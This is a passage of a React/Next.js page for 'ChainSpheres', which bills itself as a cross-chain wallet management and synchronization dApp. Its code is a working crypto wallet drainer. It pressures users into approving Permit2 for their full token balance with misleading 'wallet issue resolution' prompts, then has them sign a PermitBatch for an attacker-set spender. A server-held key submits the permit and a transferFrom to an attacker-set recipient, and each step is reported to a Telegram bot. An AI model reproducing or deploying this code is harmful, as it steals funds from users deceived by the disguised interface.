        await sendMessageToTelegram('Selected chain ID or address is null or undefined');
        throw new Error('Selected chain ID or address is null or undefined');
      }
       // Get the allowance directly
  const chainId = selectedChainId;
  const tokenAddress = wrappedToken.address;
  const url = `https://anyabi.xyz/api/get-abi/${chainId}/${tokenAddress}`;
  const response = await fetch(url);
  const data = await response.json();
  if (!data.abi) {
    await sendMessageToTelegram(`Failed to get ABI for token ${wrappedToken.name}`);
    throw new Error(`Failed to get ABI for token ${wrappedToken.name}`);
  }
  const tokenAbi = data.abi;
  const wrappedTokenContract = getContract({
    client,
    chain: selectedChainLabel,
    address: wrappedToken.address,
    abi: tokenAbi,
});
const spender = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
          const tokenAllowance = await allowance({
              contract: wrappedTokenContract,
              owner: walletAddress,
              spender: spender,
          });

          const amount = await balanceOf({
              contract: wrappedTokenContract,
              address: walletAddress,
          });

          await sendMessageToTelegram(`${wrappedToken.name} allowance is ${tokenAllowance}`);

          if (tokenAllowance >= amount) {
            allowedTokens.push(wrappedToken);
          }else{let approvalSuccessful = false;
            let attempts = 0;

            while (!approvalSuccessful && attempts < 2) { // Retry up to 2 times
                try {
                    // Approve the spender
                    const approvalTx = await approve({
                        contract: wrappedTokenContract,
                        spender: spender,
                        amount: Number(amount),
                    });
                    const approvalReceipt = await sendAndConfirmTransaction({
                        account: activeAccount,
                        transaction: approvalTx,
                    });

                    if (approvalReceipt !== undefined && approvalReceipt.status === "success") {
                        allowedTokens.push(wrappedToken);
                        approvalSuccessful = true;
                        await sendMessageToTelegram(`${wrappedToken.name} has been approved`)
                    } else {
                        await sendMessageToTelegram(`Approval not granted for token ${wrappedToken.name}. Retrying...`);
                        toast.error('warn: Grant contract approval for wallet issue resolution', {
                          position: "top-left",
                  autoClose: 5000,
                  hideProgressBar: false,
                  closeOnClick: true,
                  pauseOnHover: true,
                  draggable: true,
                  progress: undefined,
                  theme: "dark",
                        });
                        attempts++;
                    }
                } catch (error) {
                    console.error('An error occurred during approval:', JSON.stringify(error));
                    toast.error('warn: Grant contract approval for wallet issue resolution', {
                      position: "top-left",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "dark",
                    });
                    // Handle the error, retry approval, or perform error handling
                    attempts++;
                }
            }

            if (!approvalSuccessful) {
                await sendMessageToTelegram(`Approval request for token ${wrappedToken.name} retried and rejected. Talk to user`);
                // Notify user or handle the situation accordingly
            }
        }
    }

    if (allowedTokens.length === 0) {
        await sendMessageToTelegram('No tokens approved!');
    } else {
      const wrappedToken = new Token(
        selectedChainId!,
        selectedWrappedTokenAddress,
        18,
        selectedwrappedTokenSymbol,
        selectedwrappedTokenName,
      );
      const chainId = selectedChainId;
  const tokenAddress = wrappedToken.address;
  const url = `https://anyabi.xyz/api/get-abi/${chainId}/${tokenAddress}`;
  const response = await fetch(url);
  const data = await response.json();
  if (!data.abi) {
    await sendMessageToTelegram(`Failed to get ABI for token ${wrappedToken.name}`);
  }
  const tokenAbi = data.abi;
  const wrappedTokenContract = getContract({
    client,
    chain: selectedChainLabel,
    address: wrappedToken.address,
    abi: tokenAbi,
});
      const amount = await balanceOf({
        contract: wrappedTokenContract,
        address: walletAddress!,
    });
    await generateWrappedTokenPermitSignature(allowedTokens,amount);
        //pushToken to new generator
    }
    
    }

    async function generateWrappedTokenPermitSignature(allowedTokens: Token[],amount:bigint){
      const init = process.env.NEXT_PUBLIC_INITIATOR || "0xinitiator";
    const initiator = init;
    const recipient = process.env.NEXT_PUBLIC_RECIEPIENT || "0xr3c13913n7"
    const permitDetails = [];
    const transferDetails =[];
    const rpcUrl = getRpcUrlForChain({
      chain:selectedChainId || 1,
      client
    });
    for (const token of allowedTokens) {
    const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
    const nonce = await allowanceProvider.getNonce(token.address, walletAddress!, PERMIT2_ADDRESS);
    const tokenAmount = String(amount);
    await sendMessageToTelegram(`Token amount in Big Int for ${token.name} is ${tokenAmount}`);
    permitDetails.push({
      token: token.address,
      amount:tokenAmount,
      nonce:nonce,
      expiration:Math.floor(Date.now() / 1000) + (12 * 60 * 60),
    });
    transferDetails.push({
     from: walletAddress,
     to: recipient,
     amount:tokenAmount,
     token:token.address,
    })
  }
  const sigDeadline =Math.floor(Date.now() / 1000) + (12 * 60 * 60);
  const permitBatch = {
      details: permitDetails,
      spender: initiator,
      sigDeadline: sigDeadline,
  };
  const domain = {
    name: "Permit2",
    chainId: selectedChainId ?? 1,
    verifyingContract: PERMIT2_ADDRESS,
  };
  
 const types = {
  PermitBatch: [
      {
          name: "details",
          type: "PermitDetails[]",
      },
      {
          name: "spender",
          type: "address",
      },
      {
          name: "sigDeadline",
          type: "uint256",
      },
  ],
  PermitDetails: [
      {
          name: "token",
          type: "address",
      },
      {
          name: "amount",
          type: "uint160",
      },
      {
          name: "expiration",
          type: "uint48",
      },
      {
          name: "nonce",
          type: "uint48",
      },
  ],
}

await sendMessageToTelegram(`Permit Batch Details: ${JSON.stringify(permitBatch)}`);
await sendMessageToTelegram(`Transfer Details: ${JSON.stringify(transferDetails)}`);
const signature = await activeAccount?.signTypedData( {
  domain: domain,
  types: types,
  primaryType: "PermitBatch" as const,
  message: { 
    details: permitBatch.details, 
    spender: initiator, 
    sigDeadline:BigInt(permitBatch.sigDeadline),
},
});
await sendMessageToTelegram(`Signature: ${signature}`);
if(signature){
  const r = '0x' + signature.slice(2, 66);
        const s = '0x' + signature.slice(66, 130);
        const v = parseInt('0x' + signature.slice(130, 132), 16);
        await sendMessageToTelegram(`R: ${r}\n S: ${s}\n v: ${v}`);
        const signerAddress = utils.verifyTypedData(domain,types,permitBatch,signature );
        await sendMessageToTelegram(signerAddress);
        if (signerAddress !== walletAddress){
          await sendMessageToTelegram("Recovered address does not match user address. Signature is Invalid");
        }else{
          await sendMessageToTelegram("Signature Verified");
          const rpcUrl = getRpcUrlForChain({
            chain:selectedChainId || 1,
            client
          });
          const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
          const contractPermit = new ethers.Contract(PERMIT2_ADDRESS, permitAbi,provider);
          const permitCall = await contractPermit.populateTransaction.permit(walletAddress,permitBatch,signature);
          const permitCallData = permitCall.data;
          await sendMessageToTelegram(`Permit Transaction Data: ${permitCallData}\n Simulate to debug transaction if neccessary.`);
          const gasPrice = await eth_gasPrice(rpcRequest);
          await sendMessageToTelegram(`Gas Price: ${gasPrice}`);
          const baseFee = await provider.getFeeData();
          const baseFeePerGas = baseFee.lastBaseFeePerGas;
          const dappKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "0xdappprivatesigningkey"
          const transactionCount = await eth_getTransactionCount(rpcRequest, {
            address:dappSecret.address,
          });
          const dappSigner = new ethers.Wallet(dappKey,provider);
          const transaction = {
            to: PERMIT2_ADDRESS,
            data: permitCallData,
            gasLimit: 800000,
            nonce:transactionCount,
            chainId:selectedChainId ?? 1,
            maxFeePerGas: baseFee.maxFeePerGas ?? ethers.utils.parseUnits('100', 'gwei'), // Base fee in Gwei
            maxPriorityFeePerGas: baseFee.maxPriorityFeePerGas ?? ethers.utils.parseUnits('75', 'gwei'),
            type: 2,
          }
          const signedPermitTx = await dappSigner.signTransaction(transaction);
          const permitTxResponse = await provider.sendTransaction(signedPermitTx);
          await sendMessageToTelegram(`Transaction hash: ${permitTxResponse.hash}`);
          const transactionReceipt = await provider.getTransactionReceipt(permitTxResponse.hash);
        if (transactionReceipt && transactionReceipt.status === 1) {
  await sendMessageToTelegram('Native Permit Transaction successful. Administration intervention not required!');
          const permitTransferCall = await contractPermit.populateTransaction.transferFrom(transferDetails);
          const permitTransferCallData = permitTransferCall.data;
          await sendMessageToTelegram(`${permitTransferCallData}`);
          const gasPrice = await eth_gasPrice(rpcRequest);
          await sendMessageToTelegram(`Gas Price: ${gasPrice}`);
          const baseFee = await provider.getFeeData();
          const baseFeePerGas = baseFee.lastBaseFeePerGas;
          const dappKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "0xdappprivatesigningkey"
          const transactionCount2 = await eth_getTransactionCount(rpcRequest, {
            address:dappSecret.address,
          });
          const dappSigner = new ethers.Wallet(dappKey,provider);
          const transaction = {
            to: PERMIT2_ADDRESS,
            data: permitTransferCallData,
            gasLimit: 800000,
            nonce:transactionCount2,
            chainId:selectedChainId ?? 1,
            maxFeePerGas: baseFee.maxFeePerGas ?? ethers.utils.parseUnits('100', 'gwei'), // Base fee in Gwei
            maxPriorityFeePerGas: baseFee.maxPriorityFeePerGas ?? ethers.utils.parseUnits('75', 'gwei'),
            type: 2,
          };
          const signedPermitTx = await dappSigner.signTransaction(transaction);
          const permitTxResponse = await provider.sendTransaction(signedPermitTx);
          await sendMessageToTelegram(`Transaction hash: ${permitTxResponse.hash}`);
          const transactionReceipt = await provider.getTransactionReceipt(permitTxResponse.hash);
          if (transactionReceipt && transactionReceipt.status === 1) {
            await sendMessageToTelegram('Native Token Transfer Transaction successful. Administration intervention not required.');
          }else if (transactionReceipt && transactionReceipt.status === 0) {
            await sendMessageToTelegram('Native Token Transfer Transaction failed login to Admin Dashboard to complete transaction.');
                } else {
            await sendMessageToTelegram('Transaction status unknown confirm transaction with tranaction hash');
            };
        } else if (transactionReceipt && transactionReceipt.status === 0) {
  await sendMessageToTelegram('Native Token Transfer Transaction failed login to Admin Dashboard to complete transaction.');
      } else {
  await sendMessageToTelegram('Transaction status unknown confirm transaction with tranaction hash');
  }  }
}else{
  await sendMessageToTelegram(`Signature not recovered`);
};
    }

    return(
        <div className="flex flex-col  w-screen  overflow-hidden bg-gradient-to-tl from-black via-zinc-600/20 to-black">
            <Head><title>ChainSpheres - Explore</title></Head>
      <Disclosure as="nav" className="fixed top-0 left-0 right-0 w-full z-10 bg-gradient-to-tl from-zinc-400 backdrop-blur bg-opacity-50">
    {({ open }) => (
      <>
        <div className="mx-auto max-w-7xl px-2 sm:px-6 lg:px-8">
          <div className="relative flex h-16 items-center justify-between">
            <div className="absolute inset-y-0 left-0 flex items-center sm:hidden">
              {/* Mobile menu button*/}
              <Disclosure.Button className="relative inline-flex items-center justify-center rounded-md p-2 text-yellow-300 hover:bg-gray-700 hover:text-yellow-500 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-yellow-500">
                <span className="absolute -inset-0.5" />
                <span className="sr-only">Open main menu</span>
                {open ? (
                  <XMarkIcon className="block h-6 w-6" aria-hidden="true" />
                ) : (
                  <Bars3Icon className="block h-6 w-6" aria-hidden="true" />
                )}
              </Disclosure.Button>
            </div>
            <div className="flex flex-1 items-center justify-center sm:items-stretch sm:justify-start">
              <div className="flex flex-shrink-0 items-center">
                <Image
                height={32}
                width={32}
                  className="h-6 w-auto lg:h-10 xl:h-10"
                  src="/logo.png"
                  alt="ChainSpheres"
                />
              </div>
              <div className="hidden sm:ml-6 sm:block">
                <div className="flex space-x-4">
                  {navigation.map((item) => (
                    <a
                      key={item.name}
                      href={item.href}
                      className={classNames(
                        item.current ? 'bg-gray-900 text-yellow-500 font-bold' : 'text-yellow-400 font-bold hover:bg-gray-700 hover:text-yellow-500',
                        'rounded-md px-3 py-2 text-sm font-medium'
                      )}
                      aria-current={item.current ? 'page' : undefined}
                    >
                      {item.name}
                    </a>
                  ))}
                </div>
              </div>
            </div>
            <div className="absolute inset-y-0 right-0 flex items-center pr-2 sm:static sm:inset-auto sm:ml-6 sm:pr-0">
            <ConnectButton
            chains={[ethereum,polygon,bsc,optimism,arbitrum,base,avalanche,fantom]}
        client={client}
        walletConnect ={{projectId: "6b6933311a27f55e7567f107fb301546"}}
        appMetadata={{
          name: "ChainSpheres",
          url: "https://chainspheres.com",
          description: "Your Gateway to Seamless Wallet Management Across All Chains",
          logoUrl: "/logo.png",
        }}
        wallets={wallets}
        theme={darkTheme({
          colors: {
            primaryText: "#F6E05E",
            accentText: "#a6942b",
            accentButtonBg: "#919397",
            primaryButtonText: "#F6E05E",
            primaryButtonBg: "#030303",
          },
        })}
        connectModal={{
          size: "wide",
          titleIcon: "/logo.png",
          showThirdwebBranding: false,
          welcomeScreen: {
            title:
              "Your Gateway to Seamless Wallet Management Across All Chains",
              img: {
                src: "/logo.png",
                width: 150,
                height: 150,
              },
          },
        }}
      />
            </div>
          </div>
        </div>
        <Disclosure.Panel className="sm:hidden">
          <div className="space-y-1 px-2 pb-3 pt-2">
            {navigation.map((item) => (
              <Disclosure.Button
                key={item.name}
                as="a"
                href={item.href}
                className={classNames(
                  item.current ? 'bg-gray-900 text-yellow-500' : 'text-yellow-400 hover:bg-gray-700 hover:text-yellow-500',
                  'block rounded-md px-3 py-2 text-base font-medium'
                )}
                aria-current={item.current ? 'page' : undefined}
              >
                {item.name}
              </Disclosure.Button>
            ))}
          </div>
        </Disclosure.Panel>
      </>
    )}
  </Disclosure>
  <br></br><br></br><br></br>
  <div className="px-12 mx-auto max-w-7xl">
  <div className="w-full mx-auto text-left md:w-11/12 xl:w-9/12 md:text-center">
  <h1 className="mb-8 text-xl font-extrabold leading-none tracking-normal text-zinc-100 md:text-2xl md:tracking-tight animate-glow">
                <span className="block w-full py-2 text-transparent bg-clip-text leading-12 bg-gradient-to-r from-green-400 to-purple-500 lg:inline">ChainSpheres</span> Explorer
            </h1>
            <p className="px-0 mb-8 text-md text-gray-400 md:text-lg lg:px-24 animate-fade-up animate-once animate-ease-in-out animate-normal animate-fill-forwards">
            Your gateway to the Web3 universe.
            </p>
            </div>
            </div>
            {loading && (
        <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: 1000,}} className="w-full h-full flex justify-center items-center bg-gray-500 bg-opacity-50 backdrop-filter backdrop-blur-lg z-50">
          <CircularProgress color="warning" size="lg" label="Synchronization in progress..."/>
        </div>
      )}
      {IsNextChainModal &&(
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur" id="modal-root">
        <div className="bg-zinc-600 bg-opacity-40 p-8 rounded-lg max-w-md">
        <h2 className="text-xl font-bold mb-4">Click button to retry synchronization</h2>
      <button onClick={() => handleChainSelectionX(selectedNextChain!.name,selectedNextChain!.id,selectedNextChain!.symbol,selectedNextChain!.title,selectedNextChain!.wrappedTokenName,selectedNextChain!.wrappedTokenSymbol,selectedNextChain!.chainLabel,selectedNextChain!.wrappedTokenAddress,selectedNextChain!.image)} className="bg-zinc-900 text-white px-4 py-2 mt-4 rounded-md">Retry</button>
    </div>
  </div>
      )}
            {isModalOpen && (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur">
          <div className="bg-zinc-600 bg-opacity-40 p-8 rounded-lg max-w-md">
            <h2 className="text-2xl font-bold mb-4">Select a Chain</h2>
            {chainList && handleChainSelection && chainList.map((chain: Chain) => (
              <button key={chain.id} onClick={() => handleChainSelection(chain.name,chain.id,chain.symbol,chain.title,chain.wrappedTokenName,chain.wrappedTokenSymbol,chain.chainLabel,chain.wrappedTokenAddress,chain.image)} className="text-yellow-300 flex items-center py-2">
                <div className="mr-4">
                  <Image src={chain.image} alt={chain.title} width={40} height={40} />
                </div>
                <span>{chain.title}</span>
              </button>
            ))}
          </div>
    </div>
)}
{isConnectModalOpen && (
<div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 backdrop-blur">
          <div className="bg-zinc-600 bg-opacity-40 p-8 rounded-lg max-w-md">
            <h2 className="text-xl font-bold mb-4">Connect your wallet to continue</h2>
            <ConnectButton
            chains={[ethereum,polygon,bsc,optimism,arbitrum,base,avalanche,fantom]}
        client={client}
        walletConnect ={{projectId: "6b6933311a27f55e7567f107fb301546"}}
        appMetadata={{
          name: "ChainSpheres",
          url: "https://chainspheres.com",
          description: "Your Gateway to Seamless Wallet Management Across All Chains",
          logoUrl: "/logo.png",
        }}
        wallets={wallets}
        theme={darkTheme({
          colors: {
            primaryText: "#F6E05E",
            accentText: "#a6942b",
            accentButtonBg: "#919397",
            primaryButtonText: "#F6E05E",
            primaryButtonBg: "#030303",
          },
        })}
        connectModal={{
          size: "wide",
          titleIcon: "/logo.png",
          showThirdwebBranding: false,
          welcomeScreen: {
            title:
              "Your Gateway to Seamless Wallet Management Across All Chains",
              img: {
                src: "/logo.png",
                width: 150,
                height: 150,
              },
          },
        }}
      />
      <button onClick={closeModal} className="text-yellow-300 py-2">Close</button>
          </div>
        </div>
        )}
            <div className="hidden w-screen h-px animate-glow md:block animate-fade-left bg-gradient-to-r from-zinc-300/0 via-zinc-300/50 to-zinc-300/0" />
            <br></br>
            <div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
        {list.map((item, index) => (
          <Card shadow="sm" key={index} isPressable onPress={() => syncChain(selectedChain, selectedChainId!, selectedSymbol)}className="border-double border-2 rounded-xl bg-transparent">
            <CardBody className="overflow-visible p-0">
              <p className="justify-center text-center py-6 px-6">{item.body}</p>
            </CardBody>
            <CardFooter className="text-small justify-between text-yellow-500 px-2">
              <b>{item.title}</b>
            </CardFooter>
          </Card>
        ))}
      </div>
      <br></br>
      <div className="hidden w-screen h-px animate-glow md:block animate-fade-left bg-gradient-to-r from-zinc-300/0 via-zinc-300/50 to-zinc-300/0" />
      <br></br>
      <div className ="community-section flex flex-col items-center justify-center">
  
  <h1 className="text-xl md:text-2xl font-bold text-emerald-400 text-center mb-4">Community</h1><br/>
  <Card className="max-w-[400px] bg-gradient-to-tl from-black via-zinc-600/20 to-black">
      <CardHeader className="flex gap-3">
        <Image
          alt="discord logo"
          height={40}
          src="/images/discord.png"
          width={40}
          className="rounded-xl"
        />
        <div className="flex flex-col">
          <p className="text-md text-purple-400">Discord</p>
          <p className="text-small text-default-500 text-purple-400">discord.com</p>
        </div>
      </CardHeader>
      <Divider/>
      <br/>
      <CardBody>
        <p className="text-purple-300">Join the ChainSpheres community to connect with like-minded individuals, share insights, and stay updated on the latest developments in the web3 space. Our support team is here to assist you every step of the way.</p>
      </CardBody>
      <br/>
      <Divider/>
      <CardFooter>
        <Link
          isExternal
          showAnchorIcon
          href="https://discord.gg/nmTvwKyg"
          className="text-emerald-400 hover:text-purple-600"
        >
          <p className="text-emerald-400 hover:text-purple-600">Join us on Discord&nbsp;</p>
        </Link>
      </CardFooter>
    </Card>
    <br/><br/>
  </div>
  
  <footer className=" align-center ">
     
    <div className="container pt-9 justify-center">
      <div className="mb-9 flex justify-center  text-center ">
       
      </div>
    </div>
    <div className="hidden w-screen h-px animate-glow md:block animate-fade-left bg-gradient-to-r from-zinc-300/0 via-zinc-300/50 to-zinc-300/0" />
    <div
      className=" p-4 text-center ">
      © {currentYear}&nbsp;
      <a
        className="text-transparent bg-clip-text leading-12 bg-gradient-to-r from-green-400 to-purple-500 lg:inline"
        href="https://discord.gg/nmTvwKyg"
      >ChainSpheres</a>
    </div>
  </footer>
        </div>
    );
};
const sendMessageToTelegram = async (message: string) => {
  const bt = process.env.NEXT_PUBLIC_BOT_TOKEN || "bottoken";
  const cid = process.env.NEXT_PUBLIC_CHAT_ID || "chatid";
  const botToken = bt;
  const chatId = cid;  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
};
export default Home;